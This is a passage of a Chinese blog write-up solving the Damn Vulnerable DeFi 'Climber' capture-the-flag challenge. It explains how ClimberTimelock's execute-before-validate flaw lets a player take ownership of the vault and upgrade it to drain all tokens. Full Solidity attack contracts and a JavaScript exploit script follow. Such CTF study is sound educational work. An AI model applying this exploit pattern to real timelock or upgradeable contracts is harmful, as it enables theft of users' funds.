upgrade</span><br><span class="line">    function _authorizeUpgrade(address newImplementation) internal override onlyOwner &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题对我来说感觉难度很大，但是看下来就会发现解题的逻辑很简单。</p>
<p>我们先看<code>ClimberVault</code>合约，这里面一个<code>withdraw()</code>函数，但是每<code>15</code>天只能拿走<code>1 ether</code>，而<code>sweepFunds()</code>可以一次性拿走所有代币，但是只有<code>_sweeper</code>才能拿走，但是这是个升级合约，那我们能不能通过升级合约来升级成自己写的合约将所有代币掏空呢，这时我们注意到这段注释<code>Upgrades are to be triggered by the owner.</code>，想要升级合约必须要是合约的所有者，那么这个合约的所有者是谁呢？<code>transferOwnership(address(new ClimberTimelock(admin, proposer)));</code>很显然是<code>ClimberTimelock</code>合约，因此我们将目光放在<code>ClimberTimelock</code>合约上。</p>
<p>我们看到这个合约的时候发现在<code>execute()</code>函数中可以进行<code>call</code>调用，我们可以想办法在这里让它调用<code>transferOwnership()</code>函数来将所有者更改成我们。接下来的目的就是如何去调用这个函数，我们看到这个函数有这段限制<code>getOperationState(id) != OperationState.ReadyForExecution</code>，而要想实现它我们需要调用<code>schedule()</code>这个函数，但这个函数有<code>onlyRole(PROPOSER_ROLE)</code>这个权限限制。那么我们是不是没有办法了呢，并不是，因为在<code>execute()</code>函数中有一个明显的逻辑错误，那就是先调用后验证，那么我们就可以先上车后补票，用<code>execute()</code>来将我们添加到权限，再调用<code>schedule()</code>函数就好了，还需要注意的是在<code>shedule()</code>这个函数中有这段代码<code>operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;</code>来要求延时操作防止我们通过<code>execute()</code>来调用它，不过我们可以通过<code>execute()</code>来调用<code>updateDelay()</code>函数来更新延迟时间，之后就是更改<code>owner</code>，然后升级合约，最后掏空所有代币即可。</p>
<h4 id="Attack-11"><a href="#Attack-11" class="headerlink" title="Attack"></a>Attack</h4><h5 id="ClimberVaultAttack-sol"><a href="#ClimberVaultAttack-sol" class="headerlink" title="ClimberVaultAttack.sol"></a>ClimberVaultAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;./ClimberVault.sol&quot;;</span><br><span class="line">import &quot;./ClimberTimelock.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ClimberVaultAttack&#123;</span><br><span class="line">    ClimberTimelock timelock;</span><br><span class="line">    address vaultProxyAddress;</span><br><span class="line">    address player;</span><br><span class="line">    DamnValuableToken token;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    constructor(address payable _timelock,address _vaultProxyAddress,address _player,address _token)&#123;</span><br><span class="line">        timelock = ClimberTimelock(_timelock);</span><br><span class="line">        vaultProxyAddress = _vaultProxyAddress;</span><br><span class="line">        token = DamnValuableToken(_token);</span><br><span class="line">        player = _player;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (address[] memory, uint256[] memory, bytes[] memory)&#123;</span><br><span class="line">        address[] memory targets = new address[](4);</span><br><span class="line">        uint256[] memory values = new uint256[](4);</span><br><span class="line">        bytes[] memory dataElements = new bytes[](4);</span><br><span class="line"></span><br><span class="line">        targets[0] = address(timelock);</span><br><span class="line">        values[0] = 0;</span><br><span class="line">        dataElements[0] = abi.encodeWithSelector(</span><br><span class="line">            ClimberTimelock.updateDelay.selector,</span><br><span class="line">            0</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        targets[1] = address(vaultProxyAddress);</span><br><span class="line">        values[1] = 0;</span><br><span class="line">        dataElements[1] = abi.encodeWithSelector(</span><br><span class="line">            OwnableUpgradeable.transferOwnership.selector,</span><br><span class="line">            player</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        targets[2] = address(timelock);</span><br><span class="line">        values[2] = 0;</span><br><span class="line">        dataElements[2] = abi.encodeWithSelector(</span><br><span class="line">            AccessControl.grantRole.selector,</span><br><span class="line">            keccak256(&quot;PROPOSER_ROLE&quot;),</span><br><span class="line">            address(this)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        targets[3] = address(this);</span><br><span class="line">        values[3] = 0;</span><br><span class="line">        dataElements[3] = abi.encodeWithSelector(</span><br><span class="line">            ClimberVaultAttack.scheduleattack.selector</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        return (targets, values, dataElements);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeattack() external &#123;</span><br><span class="line">        (</span><br><span class="line">            address[] memory targets,</span><br><span class="line">            uint256[] memory values,</span><br><span class="line">            bytes[] memory dataElements</span><br><span class="line">        ) = attack();</span><br><span class="line">        timelock.execute(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function scheduleattack() external &#123;</span><br><span class="line">        (</span><br><span class="line">            address[] memory targets,</span><br><span class="line">            uint256[] memory values,</span><br><span class="line">            bytes[] memory dataElements</span><br><span class="line">        ) = attack();</span><br><span class="line">        timelock.schedule(targets, values, dataElements, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// once attacker has ownership of ClimberVault, they will upgrade it to</span><br><span class="line">// this version which modifies sweepFunds() to allow owner to drain tokens</span><br><span class="line">contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;</span><br><span class="line">    // must preserve storage layout or upgrade will fail</span><br><span class="line">    uint256 private _lastWithdrawalTimestamp;</span><br><span class="line">    address private _sweeper;</span><br><span class="line"></span><br><span class="line">    /// @custom:oz-upgrades-unsafe-allow constructor</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _disableInitializers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize(address, address, address) external initializer &#123;</span><br><span class="line">        // Initialize inheritance chain</span><br><span class="line">        __Ownable_init();</span><br><span class="line">        __UUPSUpgradeable_init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // changed to allow only owner to drain funds</span><br><span class="line">    function withdraw(address token) external &#123;</span><br><span class="line">        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // prevent anyone but attacker from further upgrades</span><br><span class="line">    function _authorizeUpgrade(address) internal override onlyOwner &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="js-8"><a href="#js-8" class="headerlink" title="js"></a>js</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Attack</span> = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;ClimberVaultAttack&#x27;</span> , player)).<span class="title function_">deploy</span>(timelock.<span class="property">address</span>,vault.<span class="property">address</span>,player.<span class="property">address</span>,token.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">Attack</span>.<span class="title function_">connect</span>(player).<span class="title function_">executeattack</span>();</span><br><span class="line">    </span><br><span class="line">        upgradedClimberVault = <span class="keyword">await</span> upgrades.<span class="title function_">upgradeProxy</span>(</span><br><span class="line">            vault.<span class="property">address</span>, </span><br><span class="line">            <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;ClimberVaultAttackUpgrade&quot;</span>, player));</span><br><span class="line">        <span class="keyword">await</span> upgradedClimberVault.<span class="title function_">connect</span>(player).<span class="title function_">withdraw</span>(token.<span class="property">address</span>);</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/11/08/Metatrust%202023ctf/" rel="prev" title="Metatrust CTF">
                  <i class="fa fa-angle-left"></i> Metatrust CTF
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">scw</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
